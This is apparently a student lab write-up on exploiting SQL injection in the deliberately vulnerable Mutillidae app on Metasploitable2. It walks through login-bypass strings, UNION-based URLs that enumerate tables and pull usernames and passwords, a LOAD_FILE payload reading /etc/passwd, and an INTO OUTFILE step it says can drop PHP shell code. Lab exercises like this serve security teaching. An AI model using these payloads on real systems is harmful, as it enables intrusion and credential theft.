# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![325657525-5d072558-8cfd-437f-839b-f491e2351bfc](https://github.com/pradeepasri26/sqlinjection/assets/131433142/91d38cf4-7261-4878-9c71-1724992006ed)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![325657622-28300288-17b2-4d70-b1d6-3ee0a018feac](https://github.com/pradeepasri26/sqlinjection/assets/131433142/baea06ec-f598-4e58-8971-9075a635be44)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![325657717-262a0baa-afa6-41d8-a0da-47b7cc4c5064](https://github.com/pradeepasri26/sqlinjection/assets/131433142/7eb6f9e6-bf60-4bcd-880c-b0ee52169c99)
Click on the menu Login/Register and register for an account
![325657806-cccb4d70-5d32-49a9-b7a2-c6607c283c59](https://github.com/pradeepasri26/sqlinjection/assets/131433142/5e50537d-a76a-4c01-abce-7b748fc8f6ca)
Click on the link “Please register here”
![325657884-46eba855-7aa9-4d47-9850-30a245a2a76d](https://github.com/pradeepasri26/sqlinjection/assets/131433142/4c275f89-7aed-4a8d-a982-f06197f2ba5d)
Click on “Create Account” to display the following page
![325657969-cb7680e8-8069-4289-88dd-48c982251980](https://github.com/pradeepasri26/sqlinjection/assets/131433142/090badfa-881b-4c42-b4e5-4e0c037aedd1)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:
($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![325658073-de7691c2-6b5c-446e-8c60-f93887b9fcc1](https://github.com/pradeepasri26/sqlinjection/assets/131433142/e9bd9257-5df2-4d1b-9448-d29e0c6a413c)
Click “Login”. The logged in page will show as below:
![325658149-5166ecc3-20f0-4ad6-83d5-ec9406b88479](https://github.com/pradeepasri26/sqlinjection/assets/131433142/a0b9be05-0d47-4e5f-a85e-171803756883)
Bypassing login field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”
Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![325658297-a93a6bdb-b7ab-4a94-ba98-dc5b0d0e2ee6](https://github.com/pradeepasri26/sqlinjection/assets/131433142/a4b597c5-733a-4a79-be07-08db50834432)
Click the login button and you will see it enter into the administrator page.
![325658372-b7b5d131-fcc9-4084-8173-4cb7fe583f0b](https://github.com/pradeepasri26/sqlinjection/assets/131433142/c53ed745-89e2-4ea2-bc4f-b99bcff1a7cf)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below

![325659156-c0bbbd4b-b1d1-4f88-b68b-c49962f7c5c6](https://github.com/pradeepasri26/sqlinjection/assets/131433142/ed692090-a94d-4649-91f7-832557d6c24a)
![325659228-4a23cbda-e95d-401b-863b-17356523aa32](https://github.com/pradeepasri26/sqlinjection/assets/131433142/f4a9d297-0723-48d3-85ef-29ed77f38824)
![325659315-3659e291-8c8d-42ef-8b97-7d013eba1725](https://github.com/pradeepasri26/sqlinjection/assets/131433142/69e12e90-e470-46e2-b5f7-0023c4ad590d)
![325659403-832ae9e4-aa1f-4bc2-80d8-0279af80c82c](https://github.com/pradeepasri26/sqlinjection/assets/131433142/b6ccf61d-4fa8-4b31-b0b7-8305c7599ef7)
![325659478-37e5a6fa-51cf-40c7-b33e-28b6d7ccb109](https://github.com/pradeepasri26/sqlinjection/assets/131433142/01523eee-2a66-4776-8cb2-366f1d77fafb)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![325659617-08512259-59b7-487b-9e1d-e6bc0a37dbae](https://github.com/pradeepasri26/sqlinjection/assets/131433142/cd807a3d-4a16-47a0-9bc0-95578dad990c)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.
The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![325659859-7e932a84-99b5-4b27-a7e4-0bb732ca8290](https://github.com/pradeepasri26/sqlinjection/assets/131433142/af01eef3-148b-4a93-94e7-94b815bd7340)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![325659955-4c68e9ec-cb59-44dc-8a1f-3e56b3af0041](https://github.com/pradeepasri26/sqlinjection/assets/131433142/92c6eaae-156f-4d7b-adf8-268c47e5d09f)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![325660091-daadc619-ff42-4c80-b4f3-846d4f8c1ced](https://github.com/pradeepasri26/sqlinjection/assets/131433142/5e28b185-ba4f-4ca6-8d3e-c5eafa1105a7)
As it is having 5 columns the query worked fine and it provides the correct result
![325660277-66a57a6f-0bf7-4bfd-bb4a-96a6aae3dc7a](https://github.com/pradeepasri26/sqlinjection/assets/131433142/1c131d98-1b5f-4221-9e19-c567aab00d8d)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![325660562-8d42416e-2ba9-4fdf-a24f-b1c4f75a7231](https://github.com/pradeepasri26/sqlinjection/assets/131433142/d6df498b-cd3d-4b30-b7f4-5eae6f23467b)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![325660664-64cccd61-4c32-44d5-b146-133df4cefbd9](https://github.com/pradeepasri26/sqlinjection/assets/131433142/23e4c2ee-c204-4658-9c78-2c7b082584be)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![325660765-8d2cf032-acc3-43f8-925d-f32ed0bf113e](https://github.com/pradeepasri26/sqlinjection/assets/131433142/43360278-c4d0-4c0a-ad5f-4d57108381bc)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![325660845-bda602fd-6721-4d3c-8a06-1997773608d3](https://github.com/pradeepasri26/sqlinjection/assets/131433142/70faccc5-468e-4ea6-8124-fda9ceace43a)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![325660962-7e2d45fc-92cf-4973-a51a-4ad7b6132d07](https://github.com/pradeepasri26/sqlinjection/assets/131433142/6decfa12-727f-4450-b3dd-1f379b8c7b3b)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![325661053-5dfa03df-fb62-420e-94c4-218e55944dcc](https://github.com/pradeepasri26/sqlinjection/assets/131433142/8413565a-6e8d-4682-a66f-71d7215adf58)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![325661146-a196e92c-39a6-45d9-9f5e-aad62c02d897](https://github.com/pradeepasri26/sqlinjection/assets/131433142/876c9aed-a000-4bf0-afe4-20b9ef109227)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![325661369-ce52fb71-a979-4e73-93fc-64c9a2678cd9](https://github.com/pradeepasri26/sqlinjection/assets/131433142/f6ac4e0c-3bd2-4331-9c17-ed2df2c37732)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
